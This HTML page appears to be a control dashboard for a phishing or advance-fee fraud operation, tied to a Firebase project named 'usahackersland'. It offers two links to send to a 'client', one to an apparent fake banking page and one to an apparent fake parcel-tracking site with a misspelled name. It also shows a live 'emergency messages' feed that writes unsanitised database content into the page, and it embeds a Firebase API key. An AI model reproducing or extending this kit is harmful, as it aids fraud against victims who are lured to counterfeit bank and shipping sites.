<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Home</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #000;
      color: lime;
      margin: 0;
      padding: 20px;
    }

    /* Emergency messages container */
    #emergencyBox {
      background: linear-gradient(135deg, #1e1e2f, #23234a);
      border: 2px solid cyan;
      border-radius: 14px;
      padding: 20px;
      margin: 20px auto;
      max-width: 1000px;
      font-size: 16px;
      color: white;
      box-shadow: 0 0 20px rgba(0,255,255,0.5);
    }

    .emergency-msg {
      background: rgba(0,0,0,0.6);
      border-left: 5px solid cyan;
      padding: 15px;
      margin-bottom: 15px;
      border-radius: 10px;
      text-align: left;
      animation: fadeIn 0.6s ease-in-out;
    }

    .emergency-msg p {
      margin: 5px 0;
      font-size: 15px;
    }

    .emergency-msg img {
      max-width: 100%;
      border-radius: 10px;
      margin-top: 8px;
    }

    .emergency-msg a {
      color: #00ffff;
      text-decoration: underline;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(10px); }
      to { opacity: 1; transform: translateY(0); }
    }

    /* Dashboard layout */
    .dashboard-grid {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 20px;
      margin-top: 20px;
    }

    .dashboard-section {
      background: #111;
      border-radius: 12px;
      padding: 20px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.4);
      color: lime;
      text-align: center;
    }

    .dashboard-section h2 {
      margin-bottom: 10px;
      color: limegreen;
      font-size: 20px;
    }

    .link-box {
      background: #000;
      padding: 8px;
      border: 1px solid lime;
      border-radius: 6px;
      margin-bottom: 5px;
      font-size: 14px;
      word-break: break-all;
      color: lime;
    }

    .btn {
      display: inline-block;
      padding: 10px 15px;
      margin: 5px;
      border-radius: 6px;
      border: none;
      font-weight: bold;
      cursor: pointer;
      text-decoration: none;
    }

    .btn-lime { background: lime; color: black; }
    .btn-green { background: green; color: white; }
    .btn-copy { background: #333; color: lime; border: 1px solid lime; }

    @media (max-width: 900px) {
      .dashboard-grid { grid-template-columns: 1fr; }
    }
  </style>
</head>
<body>

  <!-- Emergency Messages -->
  <div id="emergencyBox">
    ğŸš¨ Loading emergency messages...
  </div>

  <div class="dashboard-grid">
    <!-- ğŸ›ï¸ Bank Section -->
    <div class="dashboard-section">
      <h2>ğŸ›ï¸ BANK</h2>
      <p>Copy this link and send to your client:</p>
      <div class="link-box" id="bankLink">https://bulksms4.github.io/BANKING/</div>
      <button class="btn btn-copy" onclick="copyText('bankLink')">ğŸ“‹ Copy</button>
    </div>

    <!-- âœˆï¸ğŸš¢ Track Package Section -->
    <div class="dashboard-section">
      <h2>âœˆï¸ğŸš¢ Track Package ğŸ›ï¸</h2>
      <p>Copy this link and send to your client:</p>
      <div class="link-box" id="trackLink">https://x-cargo-exprees.web.app/</div>
      <button class="btn btn-copy" onclick="copyText('trackLink')">ğŸ“‹ Copy</button>
    </div>
  </div>

  <!-- Firebase -->
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>

  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
      authDomain: "usahackersland.firebaseapp.com",
      projectId: "usahackersland",
      storageBucket: "usahackersland.appspot.com",
      messagingSenderId: "588407428267",
      appId: "1:588407428267:web:7c4898cbb62efd3d5953ee",
      measurementId: "G-ZJ05T7YNSQ"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    const emergencyBox = document.getElementById("emergencyBox");

    // Listen to ALL emergency messages
    db.collection("emergency")
      .orderBy("timestamp", "desc")
      .onSnapshot((snapshot) => {
        if (snapshot.empty) {
          emergencyBox.innerHTML = "ğŸš¨ No emergency messages.";
          return;
        }

        let html = "";
        snapshot.forEach((doc) => {
          const data = doc.data();
          html += `
            <div class="emergency-msg">
              ${data.text ? `<p>${data.text}</p>` : ""}
              ${data.image ? `<img src="${data.image}" alt="Emergency">` : ""}
              ${data.link ? `<p>ğŸ”— <a href="${data.link}" target="_blank">${data.link}</a></p>` : ""}
              ${data.phone ? `<p>ğŸ“ ${data.phone}</p>` : ""}
            </div>
          `;
        });
        emergencyBox.innerHTML = html;
      });

    function copyText(id) {
      const text = document.getElementById(id).innerText;
      navigator.clipboard.writeText(text).then(() => {
        alert("âœ… Link copied: " + text);
      });
    }
  </script>
</body>
</html>
